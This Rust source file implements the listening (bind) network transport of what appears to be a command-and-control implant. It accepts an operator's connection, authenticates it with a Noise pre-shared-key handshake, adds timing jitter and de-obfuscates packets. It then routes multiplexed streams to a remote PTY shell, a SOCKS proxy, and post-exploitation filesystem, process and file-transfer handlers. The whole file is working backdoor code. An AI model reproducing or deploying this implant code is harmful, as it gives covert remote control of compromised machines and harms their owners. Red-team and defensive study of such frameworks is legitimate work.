// TCP 正向监听 (Bind) 传输层实现
//
// Agent 监听端口等待控制端连接；支持断开后重新 accept + X25519 Noise 握手。

use crate::config::{get_aes_key, get_aes_key_base};
use crate::crypto;
use crate::error::{ClientError, Result};
use crate::transport::traffic_crypto::{seal_for_wire, traffic_key, FragReassembler, OpenResult};
use crate::transport::Transport;
use async_trait::async_trait;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio_util::compat::{FuturesAsyncReadCompatExt, TokioAsyncReadCompatExt};
use yamux::{Config, Connection, Mode, WindowUpdateMode};

/// TCP Bind 传输实现
pub struct TcpBindTransport {
    url: String,
    control_stream: Option<tokio_util::compat::Compat<yamux::Stream>>,
    aes_key: Vec<u8>,
    noise_psk: Vec<u8>,
    noise_session_key: Option<[u8; 32]>,
    listener: Option<TcpListener>,
    reassembler: FragReassembler,
}

impl TcpBindTransport {
    pub fn new(url: String) -> Self {
        Self {
            url,
            control_stream: None,
            aes_key: get_aes_key(),
            noise_psk: get_aes_key_base(),
            noise_session_key: None,
            listener: None,
            reassembler: FragReassembler::new(),
        }
    }

    fn parse_addr(&self) -> Result<String> {
        let addr = self
            .url
            .trim_start_matches("bind://")
            .trim_start_matches("tcp://");
        if addr.is_empty() {
            return Err(ClientError::ConnectionError("empty bind addr".to_string()));
        }
        Ok(addr.to_string())
    }

    fn session_key(&self) -> Result<Vec<u8>> {
        Ok(traffic_key(self.noise_session_key.as_ref(), &self.aes_key)?.to_vec())
    }

    async fn accept_one(&mut self) -> Result<()> {
        let listener = self
            .listener
            .as_ref()
            .ok_or_else(|| ClientError::ConnectionError("listener not bound".to_string()))?;

        let (stream, _peer) = listener
            .accept()
            .await
            .map_err(|e| ClientError::ConnectionError(format!("accept: {e}")))?;

        let mut yamux_config = Config::default();
        yamux_config.set_max_buffer_size(100 * 1024 * 1024);
        yamux_config.set_receive_window(100 * 1024 * 1024);
        yamux_config.set_window_update_mode(WindowUpdateMode::OnRead);

        let compat_stream = stream.compat();
        let mut connection = Connection::new(compat_stream, yamux_config, Mode::Client);
        let mut control = connection.control();

        tokio::spawn(async move {
            loop {
                match connection.next_stream().await {
                    Ok(Some(stream)) => {
                        tokio::spawn(async move {
                            use futures_util::AsyncReadExt;
                            let mut stream = stream;
                            let mut type_buf = [0u8; 1];
                            if stream.read_exact(&mut type_buf).await.is_ok() {
                                use crate::transport::stream_types::{
                                    YAMUX_STREAM_FILE, YAMUX_STREAM_FS, YAMUX_STREAM_PROCESS,
                                    YAMUX_STREAM_PTY, YAMUX_STREAM_SOCKS,
                                };
                                match type_buf[0] {
                                    YAMUX_STREAM_PTY => {
                                        #[cfg(feature = "pty")]
                                        crate::pty::handle_stream(stream).await;
                                        #[cfg(not(feature = "pty"))]
                                        {
                                            use futures_util::AsyncWriteExt;
                                            let mut s = stream;
                                            let _ = s
                                                .write_all(
                                                    b"\r\n[!] PTY not compiled into this profile.\r\n",
                                                )
                                                .await;
                                            let _ = s.close().await;
                                        }
                                    }
                                    YAMUX_STREAM_SOCKS => {
                                        #[cfg(feature = "socks")]
                                        crate::socks::handle_stream(stream).await;
                                        #[cfg(not(feature = "socks"))]
                                        {
                                            let _ = stream;
                                        }
                                    }
                                    YAMUX_STREAM_FS => {
                                        #[cfg(feature = "post-ex")]
                                        crate::fs::handle_stream(stream).await;
                                        #[cfg(not(feature = "post-ex"))]
                                        {
                                            let _ = stream;
                                        }
                                    }
                                    YAMUX_STREAM_PROCESS => {
                                        #[cfg(feature = "post-ex")]
                                        crate::process::handle_stream(stream).await;
                                        #[cfg(not(feature = "post-ex"))]
                                        {
                                            let _ = stream;
                                        }
                                    }
                                    YAMUX_STREAM_FILE => {
                                        #[cfg(feature = "post-ex")]
                                        crate::file_stream::handle_stream(stream).await;
                                        #[cfg(not(feature = "post-ex"))]
                                        {
                                            let _ = stream;
                                        }
                                    }
                                    _ => {}
                                }
                            }
                        });
                    }
                    _ => break,
                }
            }
        });

        let control_stream =
            match tokio::time::timeout(std::time::Duration::from_secs(10), control.open_stream())
                .await
            {
                Ok(Ok(s)) => s,
                _ => {
                    return Err(ClientError::ConnectionError(
                        "yamux control open failed".to_string(),
                    ))
                }
            };

        let mut control_stream = control_stream.compat();

        self.noise_session_key = None;
        self.reassembler.clear();

        if self.noise_psk.is_empty() {
            return Err(ClientError::ConnectionError(
                "Noise PSK missing — refusing to accept unauthenticated bind connection".into(),
            ));
        }
        {
            let (ephemeral_key, handshake_msg) = crypto::noise_initiate(&self.noise_psk)
                .map_err(|e| ClientError::ConnectionError(format!("Noise init: {e}")))?;
            let msg_len = handshake_msg.len() as u32;
            control_stream
                .write_u32(msg_len)
                .await
                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
            control_stream
                .write_all(&handshake_msg)
                .await
                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
            control_stream
                .flush()
                .await
                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;

            let resp_len = control_stream
                .read_u32()
                .await
                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
            if resp_len as usize != crypto::NOISE_MSG_LEN {
                return Err(ClientError::ConnectionError(format!(
                    "Invalid Noise resp len: {resp_len}"
                )));
            }
            let mut server_response = vec![0u8; crypto::NOISE_MSG_LEN];
            control_stream
                .read_exact(&mut server_response)
                .await
                .map_err(|e| ClientError::ConnectionError(e.to_string()))?;
            let session_key =
                crypto::noise_complete(&ephemeral_key, &server_response, &self.noise_psk)
                    .map_err(|e| ClientError::ConnectionError(format!("Noise complete: {e}")))?;
            self.noise_session_key = Some(session_key);
        }

        self.control_stream = Some(control_stream);
        Ok(())
    }
}

#[async_trait]
impl Transport for TcpBindTransport {
    async fn connect(&mut self) -> Result<()> {
        let obfuscated_addr = self.parse_addr()?;

        let jitter = crate::utils::random_range(0, 1000);
        tokio::time::sleep(tokio::time::Duration::from_millis(jitter as u64)).await;

        if self.listener.is_none() {
            let listener = TcpListener::bind(&obfuscated_addr).await.map_err(|e| {
                ClientError::ConnectionError(format!("Bind Failed {obfuscated_addr}: {e}"))
            })?;
            self.listener = Some(listener);
        }

        // Re-accept loop: keep accepting until one control session is ready
        loop {
            match self.accept_one().await {
                Ok(()) => return Ok(()),
                Err(e) => {
                    crate::db_print!(
                        "[*] bind accept/handshake failed, waiting next peer: {e}"
                    );
                    // small backoff then accept again (listener stays open)
                    tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
                }
            }
        }
    }

    async fn send(&mut self, data: &[u8]) -> Result<()> {
        let key = self.session_key()?;
        let frames = seal_for_wire(data, &key, 0)?;
        let stream = self
            .control_stream
            .as_mut()
            .ok_or_else(|| ClientError::ConnectionError("Not connected".to_string()))?;
        for frame in frames {
            stream.write_u32(frame.len() as u32).await?;
            stream.write_all(&frame).await?;
        }
        stream.flush().await?;
        Ok(())
    }

    async fn receive(&mut self) -> Result<Vec<u8>> {
        let key = self.session_key()?;
        loop {
            let stream = self
                .control_stream
                .as_mut()
                .ok_or_else(|| ClientError::ConnectionError("Not connected".to_string()))?;
            let len = stream.read_u32().await? as usize;
            if len > 100 * 1024 * 1024 {
                return Err(ClientError::ConnectionError(
                    "Message too large".to_string(),
                ));
            }
            let mut buffer = vec![0u8; len];
            stream.read_exact(&mut buffer).await?;
            let deobf = crypto::deobfuscate_packet(buffer);
            match self.reassembler.push(deobf, &key)? {
                OpenResult::Complete(pt) => return Ok(pt),
                OpenResult::NeedMore => continue,
            }
        }
    }

    fn is_connected(&self) -> bool {
        self.control_stream.is_some()
    }
}
